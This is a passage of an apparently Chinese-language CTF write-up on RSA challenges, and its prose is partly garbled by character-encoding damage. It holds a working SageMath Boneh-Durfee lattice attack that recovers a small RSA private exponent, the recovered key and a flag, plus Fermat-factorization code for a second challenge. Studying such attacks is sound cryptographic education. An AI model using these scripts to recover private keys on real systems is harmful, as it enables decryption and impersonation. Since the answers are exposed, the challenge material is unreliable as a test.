class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>(<span class="params">N,e</span>):</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>((<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">137709853388874260067664060306224801065880567280896538344708662296491187670268243771581008615887329285442080267493172576517227603581814922784005894668293664250883858847270414696279127204843462302026428548409668060539273696154323753582118715764251826181439387752900169898505518594134423187783089073450520527969</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">85605944479801539190292577400294315989703364683792339737453887619652946907819548388390076584246192710348319524405250340541547224543819349494488596679810310694697763188201375896240755682682520811114377302206659716598003967368992125832908158096663258971132148617761060030524535044970322206572134828548118438019</span></span><br><span class="line">    example(N,e)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ° <code>d = 106354342195162244579308763693125372187924746644745144997173096990722844612139</code><br>å³å¯ <code>ISITDTU&#123;Thank5_f0r_4tt3nd1ng_0ur_C0nt3st&#125;</code></p>
<h2 id="Easy-RSA-2"><a href="#Easy-RSA-2" class="headerlink" title="Easy_RSA_2"></a>Easy_RSA_2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;##################################&#x27;</span></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1*p2*q1*q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)*(q1-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(p1+q2,<span class="number">65537</span>,n)</span><br><span class="line"><span class="comment">#5043622010330564722783560796388733110223192234657313797979729183216316602247790170027393145104828283812158304519218370476380897023249898720267053051908498011845198383126598688185743313040451851234309071530873683667360872515868401870834371902623509762498919172464493397284930232415029297203698778851121422456149280629701148108649396642433199634388011535777204188207597427548981195309015900421249473588077922607729093939587454170211363784480831197764238579460361668878037335596700513382133341370374840639374005225742007557272153800433699784092511039693877686425832957477808359462507401596842526527374816943302475357302</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(p2+q1,<span class="number">65537</span>,n)</span><br><span class="line"><span class="comment">#7919283184559406259028604751155413696993375814336862337694645459367829841130544291770103966362177145582007048754925168845793555136985754996486596987205043932984314934297789456823769422776642272151478021108135062833657996366160688598742804847633068533451034898357435150319123770512604358033881809960916484049603490477616900480883862825416570459592254659007024761917196293369565486538943942938968226701375668351560376904094935919442322484791587819687743780031411339960372463937311578960714219580981945254129150844798674023932645363519148439092971133029751088847668041720574694350298717079140377388740434213791727288722</span></span><br><span class="line"><span class="built_in">print</span> n </span><br><span class="line"><span class="comment">#8573641536164485111081609341110540574423426701587222458588002464807917555910942077276167528046769327390058096169685188870928286845342631974847171845103806710768418462668311621275704636581042137915505959767806384415314024549489538717607173007829067492516776714817262226691787436227002924225311861164296655909746846329870548266285498682510415418053656271623482202491805513797215793596385014264449282551352796096361524482384994633912515104414237252657058698433260597636367614328512751722615849959987780969423318207123668118325176544879335267439096589035064596631756303300860315257404427016819145298919974287174103934503</span></span><br><span class="line"><span class="built_in">print</span> c </span><br><span class="line"><span class="comment">#8436043641135865531308468859210199431445831063674810351906331674115825605849862045115409554309732867926457428348729196827592921108183774070414343257409618631078896543782150761081732376735501920417229787663210936174854000594130785353102718054331606096192133481536724402629697019651921188121029927710787682993814748802295545306899075962041017278877203965796981792702098381465051289581518257202127401748725944229037078896857591660248467597356051123218945757343652461844056927461929195427880969904210166880623689090977714615839624798930450630919330253477634839161931755642681718034910946900928731231093352169252474939674</span></span><br></pre></td></tr></table></figure>
<p>è²Œä¼¼å¯ä»¥è´¹é©¬åˆ†è§£ï¼Ÿ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p1å’Œp2 q1å’Œq2 éƒ½ç›¸å·®å¾ˆå°</span><br><span class="line">p1*q1 p2*q2    p1*q2 p2*q1    éƒ½å¾ˆæ¥è¿‘</span><br><span class="line">è´¹é©¬åˆ†è§£!</span><br><span class="line">å°† p1*q1,p2*q2    p1,q2,p2*q1  åˆ†åˆ«ä½œä¸ºä¸¤ç»„å› å­</span><br><span class="line">åˆ†è§£nèƒ½å¾—åˆ°è¿™4ä¸ªçš„å€¼ å†æ±‚gcdå°±å¯ä»¥å¾—åˆ°p1,p2,q1,q2äº†!</span><br></pre></td></tr></table></figure>

<p>å®é™…è·‘äº†è·‘ å‘ç°å¥½æ…¢å•Šâ€¦<br>å…ˆè´´ç€å§ ä»¥åæƒ³æƒ³æ€ä¹ˆç”¨ä¸Šç»™çš„å¦å¤–ä¸¤ä¸ªæ¡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,iroot,is_square,sqrt</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">n = <span class="number">8573641536164485111081609341110540574423426701587222458588002464807917555910942077276167528046769327390058096169685188870928286845342631974847171845103806710768418462668311621275704636581042137915505959767806384415314024549489538717607173007829067492516776714817262226691787436227002924225311861164296655909746846329870548266285498682510415418053656271623482202491805513797215793596385014264449282551352796096361524482384994633912515104414237252657058698433260597636367614328512751722615849959987780969423318207123668118325176544879335267439096589035064596631756303300860315257404427016819145298919974287174103934503</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factorize</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    a = <span class="built_in">int</span>(sqrt(n))+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b2 = a*a-n</span><br><span class="line">        <span class="keyword">if</span>(is_square(b2)):</span><br><span class="line">            b = <span class="built_in">int</span>(iroot(b2,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">            factor_list.append([a-b,a+b])</span><br><span class="line">            <span class="built_in">print</span>(factor_list)</span><br><span class="line">        a = a+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(factor_list)==<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line">t0 = time()</span><br><span class="line">factort_list = Fermat_Factorize(n)</span><br><span class="line"><span class="built_in">print</span>(factort_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=========================================\n&#x27;</span>,time()-t0)</span><br></pre></td></tr></table></figure>

<h2 id="Old-Story"><a href="#Old-Story" class="headerlink" title="Old_Story"></a>Old_Story</h2><p>é¢˜ç›®æè¿°:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is an old story about wheat and chessboard, and it&#x27;s easy, right?</span><br></pre></td></tr></table></figure>
<p>cipher.txt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[524288, 4194304, 16384, 1024, 4194304, 32, 262144, 2097152, 4194304, 16777216, 70368744177664, 2251799813685248, 8192, 8388608, 8192, 4503599627370496, 16777216, 36028797018963968, 16384, 2199023255552, 67108864, 1048576, 2097152, 18014398509481984, 33554432, 68719476736, 4, 17179869184, 536870912, 549755813888, 262144, 4294967296, 16384, 128, 288230376151711744, 137438953472, 16777216, 36028797018963968, 1024, 4503599627370496, 16384, 68719476736, 262144, 4611686018427387904]</span><br></pre></td></tr></table></figure>
